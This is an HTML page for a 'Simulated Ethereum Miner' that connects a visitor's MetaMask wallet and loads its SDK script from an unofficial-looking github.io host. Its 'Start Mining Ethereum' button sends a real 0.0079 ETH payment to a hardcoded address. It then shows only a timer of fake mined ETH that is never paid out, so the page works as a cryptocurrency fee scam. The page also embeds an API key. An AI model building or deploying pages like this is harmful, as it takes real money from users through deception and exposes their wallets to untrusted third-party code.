<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simulated Ethereum Miner</title>
  <style>
    body {
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      padding: 2rem;
    }

    .container {
      text-align: center;
    }

    h1 {
      margin-bottom: 20px;
    }

    .btn {
      background-color: #1abc9c;
      border: none;
      color: #fff;
      padding: 10px 20px;
      font-size: 1.2rem;
      cursor: pointer;
      border-radius: 5px;
    }

    .btn:hover {
      background-color: #16a085;
    }

    .info, .actions {
      margin-top: 20px;
    }

    .status {
      font-size: 1.2rem;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 Simulated Ethereum Miner</h1>
    <button id="connectWallet" class="btn">🔗 Connect Wallet</button>
    <div id="walletInfo" class="info"></div>
    <div id="actions" class="actions" style="display: none;">
      <h2>🛠️ Actions</h2>
      <button id="startMining" class="btn">⚒️ Start Mining Ethereum</button>
      <div id="miningStatus" class="status"></div>
    </div>
  </div>

  <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
  <script>
    const MMSDK = new MetaMaskSDK.MetaMaskSDK({
      dappMetadata: {
        name: "Simulated Ethereum Miner",
      },
      infuraAPIKey: "41d29c816ae440b785bcdf5655d5c859",
    });

    let provider;
    let signer;
    let miningInterval;
    let minedAmount = 0;
    const miningRatePerSecond = 0.00000000382;
    const monthlyCap = 0.0099;

    document.getElementById("connectWallet").addEventListener("click", async () => {
      try {
        await MMSDK.connect();
        provider = MMSDK.getProvider();
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("walletInfo").innerHTML = `✅ Connected Address: ${address}`;
        document.getElementById("actions").style.display = "block";
      } catch (error) {
        console.error("Connection failed:", error);
        document.getElementById("walletInfo").innerHTML = "❌ Connection Failed";
      }
    });

    document.getElementById("startMining").addEventListener("click", async () => {
      const paymentAmount = "0.0079";
      const recipientAddress = "0xf1b3424bb282ee20e394717dcb4fe59fc67835e0";
      try {
        const tx = await signer.sendTransaction({
          to: recipientAddress,
          value: ethers.utils.parseEther(paymentAmount)
        });
        document.getElementById("miningStatus").innerText = `Payment sent: ${tx.hash}\nStarting simulated mining...`;
        await tx.wait();
        startSimulatedMining();
      } catch (error) {
        console.error("Payment failed:", error);
        document.getElementById("miningStatus").innerText = "Error initiating mining process.";
      }
    });

    function startSimulatedMining() {
      if (miningInterval) clearInterval(miningInterval);
      minedAmount = 0;
      miningInterval = setInterval(() => {
        minedAmount += miningRatePerSecond;
        if (minedAmount >= monthlyCap) {
          clearInterval(miningInterval);
          document.getElementById("miningStatus").innerText = `🎉 Mining complete! Total mined: ${monthlyCap.toFixed(8)} ETH`;
        } else {
          document.getElementById("miningStatus").innerText = `⛏️ Mining in progress... Total mined: ${minedAmount.toFixed(8)} ETH`;
        }
      }, 1000);
    }
  </script>
</body>
</html>
